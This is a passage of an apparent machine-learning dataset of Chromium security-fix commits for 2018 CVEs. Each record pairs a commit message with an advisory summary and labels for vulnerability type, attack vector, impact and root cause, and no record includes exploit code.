Ic7ced1c82227109784fb536ce19a4dd51b9119ac\nReviewed-on: https:\/\/chromium-review.googlesource.com\/758916\nCommit-Queue: dsinclair <dsinclair@chromium.org>\nReviewed-by: Lei Zhang <thestig@chromium.org>\nCr-Commit-Position: refs\/heads\/master@{#515056}","summary":"Use after free in PDFium in Google Chrome prior to 64.0.3282.119 allowed a remote attacker to potentially exploit heap corruption via a crafted PDF file.","commit_message_1":"use a temporary list when unloading page when traversing the |deferred_page_unloads_| list and handling the unloads it 's possible for new page to get added to the list which will invalidate the iterator","Vulnerability Type":"Use After Free","Attack Vector":"via a crafted pdf file","Impact":"potentially exploit heap corruption","Root Cause":"caused by a use-after-free","Attack Type":"remote attacker"},{"commit_id":"018bb6d300c11acb953d51ef3cbec4cdcaf4a652","cve_id":"CVE-2018-6032","cwe_id":"CWE-20","commit_message":"SharedWorker: Introduce \"constructor origin\" concept defined in the spec\n\nThis CL introduces the \"constructor origin\" concept defined in the HTML spec:\nhttps:\/\/html.spec.whatwg.org\/multipage\/workers.html#concept-sharedworkerglobalscope-constructor-origin\n\nBug: 787103\nChange-Id: I273629760bb34e0c24f1c4d023e66e146a476407\nReviewed-on: https:\/\/chromium-review.googlesource.com\/781539\nReviewed-by: Raymes Khoury <raymes@chromium.org>\nReviewed-by: Daniel Cheng <dcheng@chromium.org>\nReviewed-by: Matt Falkenhagen <falken@chromium.org>\nReviewed-by: Mike West <mkwst@chromium.org>\nReviewed-by: Kinuko Yasuda <kinuko@chromium.org>\nCommit-Queue: Hiroki Nakagawa <nhiroki@chromium.org>\nCr-Commit-Position: refs\/heads\/master@{#520417}","summary":"Insufficient policy enforcement in Blink in Google Chrome prior to 64.0.3282.119 allowed a remote attacker to potentially leak user cross-origin data via a crafted HTML page.","commit_message_1":"introduce `` constructor origin '' concept defined in the spec this cl introduces the `` constructor origin '' concept defined in the html spec : http : \/\/<file>","Vulnerability Type":"Improper Input Validation","Attack Vector":"via a crafted html page","Impact":"potentially leak user cross - origin data","Root Cause":"caused by an error","Attack Type":"remote attacker"},{"commit_id":"a8d6ae61d266d8bc44c3dd2d08bda32db701e359","cve_id":"CVE-2018-6033","cwe_id":"CWE-20","commit_message":"Downloads : Fixed an issue of opening incorrect download file\n\nWhen one download overwrites another completed download, calling download.open in the old download causes the new download to open, which could be dangerous and undesirable. In this CL, we are trying to avoid this by blocking the opening of the old download.\n\nBug: 793620\nChange-Id: Ic948175756700ad7c08489c3cc347330daedb6f8\nReviewed-on: https:\/\/chromium-review.googlesource.com\/826477\nReviewed-by: David Trainor <dtrainor@chromium.org>\nReviewed-by: Xing Liu <xingliu@chromium.org>\nReviewed-by: John Abd-El-Malek <jam@chromium.org>\nCommit-Queue: Shakti Sahu <shaktisahu@chromium.org>\nCr-Commit-Position: refs\/heads\/master@{#525810}","summary":"Insufficient data validation in Downloads in Google Chrome prior to 64.0.3282.119 allowed a remote attacker to potentially run arbitrary code outside sandbox via a crafted Chrome Extension.","commit_message_1":"fixed an issue of opening incorrect download file when one download overwrites another completed download , calling <file> in the old download cause the new download to open , which could be dangerous and undesirable","Vulnerability Type":"Improper Input Validation","Attack Vector":"via a crafted chrome extension","Impact":"potentially run arbitrary code outside sandbox","Root Cause":"caused by a race condition when opening downloaded files","Attack Type":"remote attacker"},{"commit_id":"3298d3abf47b3a7a10e44c07d821c68a5c8aa935","cve_id":"CVE-2018-6034","cwe_id":"CWE-125","commit_message":"Tighten about IntRect use in WebGL with overflow detection\n\nBUG=784183\nTEST=test case in the bug in ASAN build\nR=kbr@chromium.org\n\nCq-Include-Trybots: master.tryserver.chromium.android:android_optional_gpu_tests_rel;master.tryserver.chromium.linux:linux_optional_gpu_tests_rel;master.tryserver.chromium.mac:mac_optional_gpu_tests_rel;master.tryserver.chromium.win:win_optional_gpu_tests_rel\nChange-Id: Ie25ca328af99de7828e28e6a6e3d775f1bebc43f\nReviewed-on: https:\/\/chromium-review.googlesource.com\/811826\nReviewed-by: Kenneth Russell <kbr@chromium.org>\nCommit-Queue: Zhenyao Mo <zmo@chromium.org>\nCr-Commit-Position: refs\/heads\/master@{#522213}","summary":"Insufficient data validation in WebGL in Google Chrome prior to 64.0.3282.119 allowed a remote attacker to perform an out of bounds memory read via a crafted HTML page.","commit_message_1":"tighten about intrect use in webgl with overflow detection","Vulnerability Type":"Out-of-bounds Read","Attack Vector":"via a crafted html page","Impact":"perform an out of bounds memory read","Root Cause":"caused by an integer overflow","Attack Type":"remote attacker"},{"commit_id":"2649de11c562aa96d336c06136a1a20c01711be0","cve_id":"CVE-2018-6035","cwe_id":"CWE-200","commit_message":"Hide DevTools frontend from webRequest API\n\nPrevent extensions from observing requests for remote DevTools frontends\nand add regression tests.\n\nAnd update ExtensionTestApi to support initializing the embedded test\nserver and port from SetUpCommandLine (before SetUpOnMainThread).\n\nBUG=797497,797500\nTEST=browser_test --gtest_filter=DevToolsFrontendInWebRequestApiTest.HiddenRequests\n\nCq-Include-Trybots: master.tryserver.chromium.linux:linux_mojo\nChange-Id: Ic8f44b5771f2d5796f8c3de128f0a7ab88a77735\nReviewed-on: https:\/\/chromium-review.googlesource.com\/844316\nCommit-Queue: Rob Wu <rob@robwu.nl>\nReviewed-by: Devlin <rdevlin.cronin@chromium.org>\nReviewed-by: Dmitry Gozman <dgozman@chromium.org>\nCr-Commit-Position: refs\/heads\/master@{#528187}","summary":"Insufficient policy enforcement in DevTools in Google Chrome prior to 64.0.3282.119 allowed a remote attacker to potentially leak user local file data via a crafted Chrome Extension.","commit_message_1":"hide devtools frontend from webrequest api prevent extension from observing request for remote devtools frontends and add regression test","Vulnerability Type":"Exposure of Sensitive Information to an Unauthorized Actor","Attack Vector":"via a crafted chrome extension","Impact":"potentially leak user local file data","Root Cause":"caused by insufficient isolation of devtools from extensions","Attack Type":"remote attacker"},{"commit_id":"9b99a43fc119a2533a87e2357cad8f603779a7b9","cve_id":"CVE-2018-6038","cwe_id":"CWE-125","commit_message":"Implement 2D texture uploading from client array with FLIP_Y or PREMULTIPLY_ALPHA.\n\nBUG=774174\nTEST=https:\/\/github.com\/KhronosGroup\/WebGL\/pull\/2555\nR=kbr@chromium.org\n\nCq-Include-Trybots: master.tryserver.chromium.android:android_optional_gpu_tests_rel;master.tryserver.chromium.linux:linux_layout_tests_slimming_paint_v2;master.tryserver.chromium.linux:linux_optional_gpu_tests_rel;master.tryserver.chromium.mac:mac_optional_gpu_tests_rel;master.tryserver.chromium.win:win_optional_gpu_tests_rel\nChange-Id: I4f4e7636314502451104730501a5048a5d7b9f3f\nReviewed-on: https:\/\/chromium-review.googlesource.com\/808665\nCommit-Queue: Zhenyao Mo <zmo@chromium.org>\nReviewed-by: Kenneth Russell <kbr@chromium.org>\nCr-Commit-Position: refs\/heads\/master@{#522003}","summary":"Heap buffer overflow in WebGL in Google Chrome prior to 64.0.3282.119 allowed a remote attacker to perform an out of bounds memory read via a crafted HTML page.","commit_message_1":"implement 2d texture uploading from client array with flip_y or premultiply_alpha","Vulnerability Type":"Out-of-bounds Read","Attack Vector":"via a crafted html page","Impact":"perform an out of bounds memory read","Root Cause":"caused by improper bounds checking by WebGL","Attack Type":"remote attacker"},{"commit_id":"209f225b2d51334eaf69ffdf002e25eaa1e0d448","cve_id":"CVE-2018-6040","cwe_id":"CWE-732","commit_message":"Fixed bug where PlzNavigate CSP in a iframe did not get the inherited CSP\n\nWhen inheriting the CSP from a parent document to a local-scheme CSP,\nit does not always get propagated to the PlzNavigate CSP. This means\nthat PlzNavigate CSP checks (like `frame-src`) would be ran against\na blank policy instead of the proper inherited policy.\n\nBug: 778658\nChange-Id: I61bb0d432e1cea52f199e855624cb7b3078f56a9\nReviewed-on: https:\/\/chromium-review.googlesource.com\/765969\nCommit-Queue: Andy Paicu <andypaicu@chromium.org>\nReviewed-by: Mike West <mkwst@chromium.org>\nCr-Commit-Position: refs\/heads\/master@{#518245}","summary":"Insufficient policy enforcement in Blink in Google Chrome prior to 64.0.3282.119 allowed a remote attacker to potentially bypass content security policy via a crafted HTML page.","commit_message_1":"fixed bug where plznavigate csp in a iframe did not get the inherited csp when inheriting the csp from a parent document to a local-scheme csp , it doe not always get propagated to the plznavigate csp","Vulnerability Type":"Incorrect Permission Assignment for Critical Resource","Attack Vector":"via a crafted html page .","Impact":"bypass security restrictions","Root Cause":"caused by inappropriate implementation","Attack Type":"remote attacker"},{"commit_id":"5cd363bc34f508c63b66e653bc41bd1783a4b711","cve_id":"CVE-2018-6041","cwe_id":"CWE-20","commit_message":"Fix issue with pending NavigationEntry being discarded incorrectly\n\nThis CL fixes an issue where we would attempt to discard a pending\nNavigationEntry when a cross-process navigation to this NavigationEntry\nis interrupted by another navigation to the same NavigationEntry.\n\nBUG=760342,797656,796135\n\nChange-Id: I204deff1efd4d572dd2e0b20e492592d48d787d9\nReviewed-on: https:\/\/chromium-review.googlesource.com\/850877\nReviewed-by: Charlie Reis <creis@chromium.org>\nCommit-Queue: Camille Lamy <clamy@chromium.org>\nCr-Commit-Position: refs\/heads\/master@{#528611}","summary":"Incorrect security UI in navigation in Google Chrome prior to 64.0.3282.119 allowed a remote attacker to spoof the contents of the Omnibox (URL bar) via a crafted HTML page.","commit_message_1":"fix issue with pending navigationentry being discarded incorrectly this cl fix an issue where we would attempt to discard a pending navigationentry when a cross-process navigation to this navigationentry is interrupted by another navigation to the same navigationentry","Vulnerability Type":"Improper Input Validation","Attack Vector":"via a crafted html page","Impact":"spoof the contents of the omnibox ( url bar )","Root Cause":"caused by an error","Attack Type":"remote attacker"},{"commit_id":"b3f0207c14fccc11aaa9d4975ebe46554ad289cb","cve_id":"CVE-2018-6042","cwe_id":"CWE-20","commit_message":"Add a few more confusable map entries\n\n1. Map Malaylam U+0D1F to 's'.\n2. Map 'small-cap-like' Cyrillic letters to \"look-alike\" Latin lowercase\nletters.\n\nThe characters in new confusable map entries are replaced by their Latin\n\"look-alike\" characters before the skeleton is calculated to compare with\ntop domain names.\n\nBug: 784761,773930\nTest: components_unittests --gtest_filter=*IDNToUni*\nChange-Id: Ib26664e21ac5eb290e4a2993b01cbf0edaade0ee\nReviewed-on: https:\/\/chromium-review.googlesource.com\/805214\nReviewed-by: Peter Kasting <pkasting@chromium.org>\nCommit-Queue: Jungshik Shin <jshin@chromium.org>\nCr-Commit-Position: refs\/heads\/master@{#521648}","summary":"Incorrect security UI in Omnibox in Google Chrome prior to 64.0.3282.119 allowed a remote attacker to spoof the contents of the Omnibox (URL bar) via a crafted HTML page.","commit_message_1":"add a few more confusable map entry <number>","Vulnerability Type":"Improper Input Validation","Attack Vector":"via a crafted html page","Impact":"spoof the contents of the omnibox ( url bar )","Root Cause":"caused by an error","Attack Type":"remote attacker"},{"commit_id":"36fd3c9a6ba9fce9dd80c442c3ba5decd8e4c065","cve_id":"CVE-2018-6043","cwe_id":"CWE-20","commit_message":"Reland \"Launching an external protocol handler now escapes the URL.\"\n\nThis is a reland of 2401e58572884b3561e4348d64f11ac74667ef02\nOriginal change's description:\n> Launching an external protocol handler now escapes the URL.\n> \n> Fixes bug introduced in r102449.\n> \n> Bug: 785809\n> Change-Id: I9e6dd1031dd7e7b8d378b138ab151daefdc0c6dc\n> Reviewed-on: https:\/\/chromium-review.googlesource.com\/778747\n> Commit-Queue: Matt Giuca <mgiuca@chromium.org>\n> Reviewed-by: Eric Lawrence <elawrence@chromium.org>\n> Reviewed-by: Ben Wells <benwells@chromium.org>\n> Cr-Commit-Position: refs\/heads\/master@{#518848}\n\nBug: 785809\nChange-Id: Ib8954584004ff5681654398db76d48cdf4437df7\nReviewed-on: https:\/\/chromium-review.googlesource.com\/788551\nReviewed-by: Ben Wells <benwells@chromium.org>\nCommit-Queue: Matt Giuca <mgiuca@chromium.org>\nCr-Commit-Position: refs\/heads\/master@{#519203}","summary":"Insufficient data validation in External Protocol Handler in Google Chrome prior to 64.0.3282.119 allowed a remote attacker to potentially execute arbitrary programs on user machine via a crafted HTML page.","commit_message_1":"reland `` launching an external protocol handler now escape the url","Vulnerability Type":"Improper Input Validation","Attack Vector":"via a crafted html page","Impact":"potentially execute arbitrary programs on user machine","Root Cause":"caused by insufficient escaping with external URL handlers","Attack Type":"remote attacker"},{"commit_id":"24bbdc5f95f80a7700e232a272a6ea1811c0dcaf","cve_id":"CVE-2018-6046","cwe_id":"CWE-20","commit_message":"Improve sanitization of remoteFrontendUrl in DevTools\n\nThis change ensures that the decoded remoteFrontendUrl parameter cannot\ncontain any single quote in its value. As of this commit, none of the\npermitted query params in SanitizeFrontendQueryParam can contain single\nquotes.\nNote that the existing SanitizeEndpoint function does not explicitly\ncheck for single quotes. This is fine since single quotes in the query\nstring are already URL-encoded and the values validated by\nSanitizeEndpoint are not url-decoded elsewhere.\n\nBUG=798163\nTEST=Manually, see https:\/\/crbug.com\/798163#c1\nTEST=.\/unit_tests --gtest_filter=DevToolsUIBindingsTest.SanitizeFrontendURL\n\nChange-Id: I5a08e8ce6f1abc2c8d2a0983fef63e1e194cd242\nReviewed-on: https:\/\/chromium-review.googlesource.com\/846979\nReviewed-by: Dmitry Gozman <dgozman@chromium.org>\nCommit-Queue: Rob Wu <rob@robwu.nl>\nCr-Commit-Position: refs\/heads\/master@{#527250}","summary":"Insufficient data validation in DevTools in Google Chrome prior to 64.0.3282.119 allowed a remote attacker to potentially leak user cross-origin data via a crafted Chrome Extension.","commit_message_1":"improve sanitization of remotefrontendurl in devtools this change ensures that the decoded remotefrontendurl parameter can not contain any single quote in it value","Vulnerability Type":"Improper Input Validation","Attack Vector":"via a crafted chrome extension","Impact":"potentially leak user cross - origin data","Root Cause":"caused by insufficient isolation of devtools from extensions","Attack Type":"remote attacker"},{"commit_id":"fae4d7b7d7e5c8a04a8b7a3258c0fc8362afa24c","cve_id":"CVE-2018-6047","cwe_id":"CWE-20","commit_message":"Simplify WebGL error message\n\nThe WebGL exception message text contains the full URL of a blocked\ncross-origin resource. It should instead contain only a generic notice.\n\nBug: 799847\nCq-Include-Trybots: master.tryserver.chromium.android:android_optional_gpu_tests_rel;master.tryserver.chromium.linux:linux_optional_gpu_tests_rel;master.tryserver.chromium.mac:mac_optional_gpu_tests_rel;master.tryserver.chromium.win:win_optional_gpu_tests_rel\nChange-Id: I3a7f00462a4643c41882f2ee7e7767e6d631557e\nReviewed-on: https:\/\/chromium-review.googlesource.com\/854986\nReviewed-by: Brandon Jones <bajones@chromium.org>\nReviewed-by: Kenneth Russell <kbr@chromium.org>\nCommit-Queue: Eric Lawrence <elawrence@chromium.org>\nCr-Commit-Position: refs\/heads\/master@{#528458}","summary":"Insufficient policy enforcement in WebGL in Google Chrome prior to 64.0.3282.119 allowed a remote attacker to potentially leak user redirect URL via a crafted HTML page.","commit_message_1":"simplify webgl error message the webgl exception message text contains the full url of a blocked cross-origin resource","Vulnerability Type":"Improper Input Validation","Attack Vector":"via a crafted html page","Impact":"potentially leak user redirect url","Root Cause":"caused by a cross origin URL leak","Attack Type":"remote attacker"},{"commit_id":"931711135c90568f677cf42d94f2591a7eeced2e","cve_id":"CVE-2018-6048","cwe_id":"CWE-20","commit_message":"Inherit referrer and policy when creating a nested browsing context\n\nBUG=763194\nR=estark@chromium.org\n\nChange-Id: Ide3950269adf26ba221f573dfa088e95291ab676\nReviewed-on: https:\/\/chromium-review.googlesource.com\/732652\nReviewed-by: Emily Stark <estark@chromium.org>\nCommit-Queue: Jochen Eisinger <jochen@chromium.org>\nCr-Commit-Position: refs\/heads\/master@{#511211}","summary":"Insufficient policy enforcement in Blink in Google Chrome prior to 64.0.3282.119 allowed a remote attacker to potentially leak referrer information via a crafted HTML page.","commit_message_1":"inherit referrer and policy when creating a nested browsing context","Vulnerability Type":"Improper Input Validation","Attack Vector":"via a crafted html page","Impact":"potentially leak referrer information","Root Cause":"caused by an error","Attack Type":"remote attacker"},{"commit_id":"56762260ca8ef62578fa4718b7d47711f7e120dc","cve_id":"CVE-2018-6049","cwe_id":null,"commit_message":"Elide the permission bubble title from the head of the string.\n\nLong URLs can be used to spoof other origins in the permission bubble\ntitle. This CL customises the title to be elided from the head, which\nensures that the maximal amount of the URL host is displayed in the case\nwhere the URL is too long and causes the string to overflow.\n\nImplementing the ellision means that the title cannot be multiline\n(where elision is not well supported). Note that in English, the\nwindow title is a string \"$ORIGIN wants to\", so the non-origin\ncomponent will not be elided. In other languages, the non-origin\ncomponent may appear fully or partly before the origin (e.g. in\nFilipino, \"Gusto ng $ORIGIN na\"), so it may be elided there if the\nURL is sufficiently long. This is not optimal, but the URLs that are\nsufficiently long to trigger the elision are probably malicious, and\ndisplaying the most relevant component of the URL is most important\nfor security purposes.\n\nBUG=774438\n\nChange-Id: I75c2364b10bf69bf337c7f4970481bf1809f6aae\nReviewed-on: https:\/\/chromium-review.googlesource.com\/768312\nReviewed-by: Ben Wells <benwells@chromium.org>\nReviewed-by: Lucas Garron <lgarron@chromium.org>\nReviewed-by: Matt Giuca <mgiuca@chromium.org>\nCommit-Queue: Dominick Ng <dominickn@chromium.org>\nCr-Commit-Position: refs\/heads\/master@{#516921}","summary":"Incorrect security UI in permissions prompt in Google Chrome prior to 64.0.3282.119 allowed a remote attacker to spoof the origin to which permission is granted via a crafted HTML page.","commit_message_1":"elide the permission bubble title from the head of the string","Vulnerability Type":"unspecified","Attack Vector":"via a crafted html page","Impact":"spoof the origin to which permission is granted","Root Cause":"caused by an error","Attack Type":"remote attacker"},{"commit_id":"a30f64b4ae13255535a4947616fce484c54207df","cve_id":"CVE-2018-6050","cwe_id":"CWE-20","commit_message":"Block dotless-i \/ j + a combining mark\n\nU+0131 (doltess i) and U+0237 (dotless j) are blocked from being\nfollowed by a combining mark in U+0300 block.\n\nBug: 774842\nTest: See the bug\nChange-Id: I92aac0e97233184864d060fd0f137a90b042c679\nReviewed-on: https:\/\/chromium-review.googlesource.com\/767888\nCommit-Queue: Jungshik Shin <jshin@chromium.org>\nReviewed-by: Peter Kasting <pkasting@chromium.org>\nCr-Commit-Position: refs\/heads\/master@{#517605}","summary":"Incorrect security UI in Omnibox in Google Chrome prior to 64.0.3282.119 allowed a remote attacker to spoof the contents of the Omnibox (URL bar) via a crafted HTML page.","commit_message_1":"block dotless-i \/ j + a combining mark u+<number> ( doltess i ) and u+<number> ( dotless j ) are blocked from being followed by a combining mark in u+<number> block","Vulnerability Type":"Improper Input Validation","Attack Vector":"via a crafted html page","Impact":"spoof the contents of the omnibox ( url bar )","Root Cause":"caused by an error","Attack Type":"remote attacker"},{"commit_id":"0da6dcdbe8e34740133773d20cc466b89d399d0a","cve_id":"CVE-2018-6051","cwe_id":"CWE-79","commit_message":"Restrict the xss audit report URL to same origin\n\nBUG=441275\nR=tsepez@chromium.org,mkwst@chromium.org\n\nChange-Id: I27bc8e251b9ad962c3b4fdebf084a2b9152f915d\nReviewed-on: https:\/\/chromium-review.googlesource.com\/768367\nReviewed-by: Tom Sepez <tsepez@chromium.org>\nReviewed-by: Mike West <mkwst@chromium.org>\nCommit-Queue: Jochen Eisinger <jochen@chromium.org>\nCr-Commit-Position: refs\/heads\/master@{#516666}","summary":"XSS Auditor in Google Chrome prior to 64.0.3282.119, did not ensure the reporting URL was in the same origin as the page it was on, which allowed a remote attacker to obtain referrer details via a crafted HTML page.","commit_message_1":"restrict the x audit report url to same origin","Vulnerability Type":"Cross-site Scripting","Attack Vector":"via a crafted html page","Impact":"obtain sensitive information","Root Cause":"caused by a referrer leak","Attack Type":"remote attacker"},{"commit_id":"6c6888565ff1fde9ef21ef17c27ad4c8304643d2","cve_id":"CVE-2018-6053","cwe_id":"CWE-200","commit_message":"TopSites: Clear thumbnails from the cache when their URLs get removed\n\nWe already cleared the thumbnails from persistent storage, but they\nremained in the in-memory cache, so they remained accessible (until the\nnext Chrome restart) even after all browsing data was cleared.\n\nBug: 758169\nChange-Id: Id916d22358430a82e6d5043ac04fa463a32f824f\nReviewed-on: https:\/\/chromium-review.googlesource.com\/758640\nCommit-Queue: Marc Treib <treib@chromium.org>\nReviewed-by: Sylvain Defresne <sdefresne@chromium.org>\nCr-Commit-Position: refs\/heads\/master@{#514861}","summary":"Inappropriate implementation in New Tab Page in Google Chrome prior to 64.0.3282.119 allowed a local attacker to view website thumbnail images after clearing browser data via a crafted HTML page.","commit_message_1":"clear thumbnail from the cache when their url get removed we already cleared the thumbnail from persistent storage , but they remained in the in-memory cache , so they remained accessible ( until the next chrome restart ) even after all browsing data wa cleared","Vulnerability Type":"Exposure of Sensitive Information to an Unauthorized Actor","Attack Vector":"via a crafted html page","Impact":"view website thumbnail images after clearing browser data","Root Cause":"caused by a leak of page thumbnails","Attack Type":"local attacker"},{"commit_id":"90585e657db48f93bd73bc45d4caa975323da41b","cve_id":"CVE-2018-6054","cwe_id":"CWE-416","commit_message":"Validate frame after conversion in chrome.send\n\nBUG=797511\nTEST=Manually, see https:\/\/crbug.com\/797511#c1\n\nChange-Id: Ib1a99db4d7648fb1325eb6d7af4ef111d6dda4cb\nReviewed-on: https:\/\/chromium-review.googlesource.com\/844076\nCommit-Queue: Rob Wu <rob@robwu.nl>\nReviewed-by: Kentaro Hara <haraken@chromium.org>\nCr-Commit-Position: refs\/heads\/master@{#526197}","summary":"Use after free in WebUI in Google Chrome prior to 64.0.3282.119 allowed a remote attacker to potentially exploit heap corruption via a crafted Chrome Extension.","commit_message_1":"validate frame after conversion in <file>","Vulnerability Type":"Use After Free","Attack Vector":"via a crafted chrome extension","Impact":"potentially exploit heap corruption","Root Cause":"caused by a use-after-free","Attack Type":"remote attacker"},{"commit_id":"df5b1e1f88e013bc96107cc52c4a4f33a8238444","cve_id":"CVE-2018-6085","cwe_id":"CWE-20","commit_message":"Blockfile cache: fix long-standing sparse + evict reentrancy problem\n\nThanks to nedwilliamson@ (on gmail) for an alternative perspective\nplus a reduction to make fixing this much easier.\n\nBug: 826626, 518908, 537063, 802886\nChange-Id: Ibfa01416f9a8e7f7b361e4f93b4b6b134728b85f\nReviewed-on: https:\/\/chromium-review.googlesource.com\/985052\nReviewed-by: Matt Menke <mmenke@chromium.org>\nCommit-Queue: Maks Orlovich <morlovich@chromium.org>\nCr-Commit-Position: refs\/heads\/master@{#547103}","summary":"Re-entry of a destructor in Networking Disk Cache in Google Chrome prior to 66.0.3359.117 allowed a remote attacker to execute arbitrary code via a crafted HTML page.","commit_message_1":"fix long-standing sparse + evict reentrancy problem thanks to nedwilliamson @ ( on gmail ) for an alternative perspective plus a reduction to make fixing this much easier","Vulnerability Type":"Improper Input Validation","Attack Vector":"via a crafted html page","Impact":"execute arbitrary code","Root Cause":"caused by a use-after-free","Attack Type":"remote attacker"},{"commit_id":"c9d673b54832afde658f214d7da7d0453fa89774","cve_id":"CVE-2018-6086","cwe_id":"CWE-416","commit_message":"[MemCache] Fix bug while iterating LRU list in eviction\n\nIt was possible to reanalyze a previously doomed entry.\n\nBug: 827492\nChange-Id: I5d34d2ae87c96e0d2099e926e6eb2c1b30b01d63\nReviewed-on: https:\/\/chromium-review.googlesource.com\/987919\nCommit-Queue: Josh Karlin <jkarlin@chromium.org>\nReviewed-by: Maks Orlovich <morlovich@chromium.org>\nCr-Commit-Position: refs\/heads\/master@{#547236}","summary":"A double-eviction in the Incognito mode cache that lead to a user-after-free in Networking Disk Cache in Google Chrome prior to 66.0.3359.117 allowed a remote attacker to execute arbitrary code via a crafted HTML page.","commit_message_1":"fix bug while iterating lru list in eviction it wa possible to reanalyze a previously doomed entry","Vulnerability Type":"Use After Free","Attack Vector":"via a crafted html page","Impact":"execute arbitrary code","Root Cause":"caused by a use-after-free","Attack Type":"remote attacker"},{"commit_id":"94b3728a2836da335a10085d4089c9d8e1c9d225","cve_id":"CVE-2018-6088","cwe_id":"CWE-20","commit_message":"Copy visible_pages_ when iterating over it.\n\nOn this case, a call inside the loop may cause visible_pages_ to\nchange.\n\nBug: 822091\nChange-Id: I41b0715faa6fe3e39203cd9142cf5ea38e59aefb\nReviewed-on: https:\/\/chromium-review.googlesource.com\/964592\nReviewed-by: dsinclair <dsinclair@chromium.org>\nCommit-Queue: Henrique Nakashima <hnakashima@chromium.org>\nCr-Commit-Position: refs\/heads\/master@{#543494}","summary":"An iterator-invalidation bug in PDFium in Google Chrome prior to 66.0.3359.117 allowed a remote attacker to execute arbitrary code inside a sandbox via a crafted PDF file.","commit_message_1":"copy visible_pages_ when iterating over it","Vulnerability Type":"Improper Input Validation","Attack Vector":"via a crafted pdf file","Impact":"execute arbitrary code inside a sandbox","Root Cause":"caused by a use-after-free","Attack Type":"remote attacker"},{"commit_id":"e89b9003df8c7bd7822e5b6c0a76e726a6ed1505","cve_id":"CVE-2018-6089","cwe_id":"CWE-20","commit_message":"Skip Service workers in requests for mime handler plugins\n\nBUG=808838\nTEST=.\/browser_tests --gtest_filter=*\/ServiceWorkerTest.MimeHandlerView*\n\nCq-Include-Trybots: master.tryserver.chromium.linux:linux_mojo\nChange-Id: I82e75c200091babbab648a04232db47e2938d914\nReviewed-on: https:\/\/chromium-review.googlesource.com\/914150\nCommit-Queue: Rob Wu <rob@robwu.nl>\nReviewed-by: Istiaque Ahmed <lazyboy@chromium.org>\nReviewed-by: Matt Falkenhagen <falken@chromium.org>\nCr-Commit-Position: refs\/heads\/master@{#537386}","summary":"A lack of CORS checks, after a Service Worker redirected to a cross-origin PDF, in Service Worker in Google Chrome prior to 66.0.3359.117 allowed a remote attacker to leak limited cross-origin data via a crafted HTML page.","commit_message_1":"skip service worker in request for mime handler plugins","Vulnerability Type":"Improper Input Validation","Attack Vector":"via a crafted html page","Impact":"leak limited cross - origin data","Root Cause":"caused by an error","Attack Type":"remote attacker"},{"commit_id":"59ad2dcbe6dd5c5d846944258e6cd26a700ade83","cve_id":"CVE-2018-6091","cwe_id":null,"commit_message":"service worker: Disable interception when OBJECT\/EMBED uses ImageLoader.\n\nPer the specification, service worker should not intercept requests for\nOBJECT\/EMBED elements.\n\nR=kinuko\n\nBug: 771933\nChange-Id: Ia6da6107dc5c68aa2c2efffde14bd2c51251fbd4\nReviewed-on: https:\/\/chromium-review.googlesource.com\/927303\nReviewed-by: Kinuko Yasuda <kinuko@chromium.org>\nCommit-Queue: Matt Falkenhagen <falken@chromium.org>\nCr-Commit-Position: refs\/heads\/master@{#538027}","summary":"Service Workers can intercept any request made by an <embed> or <object> tag in Fetch API in Google Chrome prior to 66.0.3359.117 allowed a remote attacker to leak cross-origin data via a crafted HTML page.","commit_message_1":"disable interception when object\/embed us imageloader","Vulnerability Type":"unspecified","Attack Vector":"via a crafted html page","Impact":"leak cross - origin data","Root Cause":"caused by the incorrect handling of plug-ins by Service Worker","Attack Type":"remote attacker"},{"commit_id":"0749ec24fae74ec32d0567eef0e5ec43c84dbcb9","cve_id":"CVE-2018-6094","cwe_id":"CWE-119","commit_message":"Call HeapObjectHeader::checkHeader solely for its side-effect.\n\nThis requires changing its signature. This is a preliminary stage to making it\nprivate.\n\nBUG=633030\n\nReview-Url: https:\/\/codereview.chromium.org\/2698673003\nCr-Commit-Position: refs\/heads\/master@{#460489}","summary":"Inline metadata in GarbageCollection in Google Chrome prior to 66.0.3359.117 allowed a remote attacker to potentially exploit heap corruption via a crafted HTML page.","commit_message_1":"solely for it side-effect","Vulnerability Type":"buffer overflow","Attack Vector":"via a crafted html page","Impact":"potentially exploit heap corruption","Root Cause":"caused by an exploit hardening regression","Attack Type":"remote attacker"},{"commit_id":"36f801fdbec07d116a6f4f07bb363f10897d6a51","cve_id":"CVE-2018-6096","cwe_id":null,"commit_message":"If a page calls |window.focus()|, kick it out of fullscreen.\n\nBUG=776418, 800056\n\nChange-Id: I1880fe600e4814c073f247c43b1c1ac80c8fc017\nReviewed-on: https:\/\/chromium-review.googlesource.com\/852378\nReviewed-by: Nasko Oskov <nasko@chromium.org>\nReviewed-by: Philip J\u00e4genstedt <foolip@chromium.org>\nCommit-Queue: Avi Drissman <avi@chromium.org>\nCr-Commit-Position: refs\/heads\/master@{#533790}","summary":"A JavaScript focused window could overlap the fullscreen notification in Fullscreen in Google Chrome prior to 66.0.3359.117 allowed a remote attacker to obscure the full screen warning via a crafted HTML page.","commit_message_1":"if a page call |<file> ( ) | , kick it out of fullscreen","Vulnerability Type":"unspecified","Attack Vector":"via a crafted html page","Impact":"obscure the full screen warning","Root Cause":"overlap the fullscreen notification","Attack Type":"remote attacker"},{"commit_id":"cc0bbcbe7c986094da8e58c37a21fdd179b686b0","cve_id":"CVE-2018-6098","cwe_id":null,"commit_message":"Restrict Latin Small Letter Thorn (U+00FE) to Icelandic domains\n\nThis character (\u00fe) can be confused with both b and p when used in a domain\nname. IDN spoof checker doesn't have a good way of flagging a character as\nconfusable with multiple characters, so it can't catch spoofs containing\nthis character. As a practical fix, this CL restricts this character to\ndomains under Iceland's ccTLD (.is). With this change, a domain name containing\n\"\u00fe\" with a non-.is TLD will be displayed in punycode in the UI.\n\nThis change affects less than 10 real world domains with limited popularity.\n\nBug: 798892, 843352, 904327, 1017707\nChange-Id: Ib07190dcde406bf62ce4413688a4fb4859a51030\nReviewed-on: https:\/\/chromium-review.googlesource.com\/c\/chromium\/src\/+\/1879992\nCommit-Queue: Mustafa Emre Acer <meacer@chromium.org>\nReviewed-by: Christopher Thompson <cthomp@chromium.org>\nCr-Commit-Position: refs\/heads\/master@{#709309}","summary":"Incorrect handling of confusable characters in URL Formatter in Google Chrome prior to 66.0.3359.117 allowed a remote attacker to perform domain spoofing via IDN homographs via a crafted domain name.","commit_message_1":"restrict latin small letter thorn ( u+00fe ) to icelandic domain this character ( \u00fe ) can be confused with both b and p when used in a domain name","Vulnerability Type":"incorrect handling","Attack Vector":"via a crafted html page","Impact":"perform domain spoofing via idn","Root Cause":"caused by an error","Attack Type":"remote 